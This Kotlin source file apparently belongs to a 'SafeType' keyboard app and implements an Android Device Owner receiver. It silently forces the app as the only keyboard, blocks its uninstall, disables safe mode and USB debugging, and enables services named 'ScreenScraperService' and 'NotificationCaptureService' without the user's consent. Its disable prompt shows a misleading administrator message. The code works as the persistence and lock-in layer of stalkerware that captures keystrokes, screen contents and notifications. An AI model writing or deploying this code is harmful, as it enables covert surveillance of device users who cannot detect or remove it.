package com.safetype.keyboard

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.UserHandle
import android.os.UserManager
import android.provider.Settings
import android.util.Log

/**
 * Device Owner receiver. Set via:
 *   adb shell dpm set-device-owner com.safetype.keyboard/.AdminReceiver
 *
 * Once active, silently grants permissions, locks settings, and prevents uninstall.
 */
class AdminReceiver : DeviceAdminReceiver() {

    companion object {
        private const val TAG = "AdminReceiver"

        fun getComponentName(context: Context): ComponentName =
            ComponentName(context, AdminReceiver::class.java)

        /**
         * Apply all Device Owner restrictions. Called on enable and on every boot.
         */
        fun applyAllRestrictions(context: Context) {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = getComponentName(context)

            if (!dpm.isDeviceOwnerApp(context.packageName)) {
                Log.w(TAG, "Not device owner — skipping restrictions")
                return
            }

            lockDefaultKeyboard(context, dpm, admin)
            preventUninstall(dpm, admin, context)
            addUserRestrictions(dpm, admin)
            enableAccessibilityService(context, dpm)
            enableNotificationListener(context, dpm)
            Log.i(TAG, "All Device Owner restrictions applied")
        }

        /**
         * Force SafeType as the default input method and prevent changes.
         */
        private fun lockDefaultKeyboard(
            context: Context,
            dpm: DevicePolicyManager,
            admin: ComponentName
        ) {
            val imeId = "${context.packageName}/.SafeTypeIME"
            try {
                dpm.setSecureSetting(admin, Settings.Secure.DEFAULT_INPUT_METHOD, imeId)
                // Also set enabled input methods to only include ours
                dpm.setSecureSetting(admin, Settings.Secure.ENABLED_INPUT_METHODS, imeId)
                Log.i(TAG, "Default keyboard locked to: $imeId")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to set default keyboard", e)
            }
        }

        /**
         * Block uninstall of this package.
         */
        private fun preventUninstall(
            dpm: DevicePolicyManager,
            admin: ComponentName,
            context: Context
        ) {
            try {
                dpm.setUninstallBlocked(admin, context.packageName, true)
                Log.i(TAG, "Uninstall blocked for ${context.packageName}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to block uninstall", e)
            }
        }

        /**
         * Add user restrictions to prevent changing default apps and other settings.
         */
        private fun addUserRestrictions(dpm: DevicePolicyManager, admin: ComponentName) {
            val restrictions = listOf(
                UserManager.DISALLOW_CONFIG_DEFAULT_APPS,  // Can't change default keyboard
                UserManager.DISALLOW_SAFE_BOOT,            // Can't boot into safe mode
                UserManager.DISALLOW_DEBUGGING_FEATURES    // Can't enable USB debugging
            )
            for (restriction in restrictions) {
                try {
                    dpm.addUserRestriction(admin, restriction)
                    Log.i(TAG, "User restriction applied: $restriction")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to apply restriction: $restriction", e)
                }
            }
        }

        /**
         * Silently enable the accessibility service via Device Owner secure settings.
         */
        private fun enableAccessibilityService(context: Context, dpm: DevicePolicyManager) {
            val admin = getComponentName(context)
            val serviceId = "${context.packageName}/${context.packageName}.ScreenScraperService"
            try {
                dpm.setSecureSetting(
                    admin,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    serviceId
                )
                dpm.setSecureSetting(
                    admin,
                    Settings.Secure.ACCESSIBILITY_ENABLED,
                    "1"
                )
                Log.i(TAG, "Accessibility service enabled: $serviceId")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to enable accessibility service", e)
            }
        }

        /**
         * Silently enable notification listener via Device Owner.
         */
        private fun enableNotificationListener(context: Context, dpm: DevicePolicyManager) {
            val admin = getComponentName(context)
            val listenerComponent = "${context.packageName}/${context.packageName}.NotificationCaptureService"
            try {
                dpm.setSecureSetting(
                    admin,
                    "enabled_notification_listeners",
                    listenerComponent
                )
                Log.i(TAG, "Notification listener enabled: $listenerComponent")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to enable notification listener", e)
            }
        }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.i(TAG, "Device Admin enabled")
        applyAllRestrictions(context)
    }

    override fun onProfileProvisioningComplete(context: Context, intent: Intent) {
        super.onProfileProvisioningComplete(context, intent)
        Log.i(TAG, "Profile provisioning complete")
        applyAllRestrictions(context)
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "This app is required by your device administrator."
    }
}
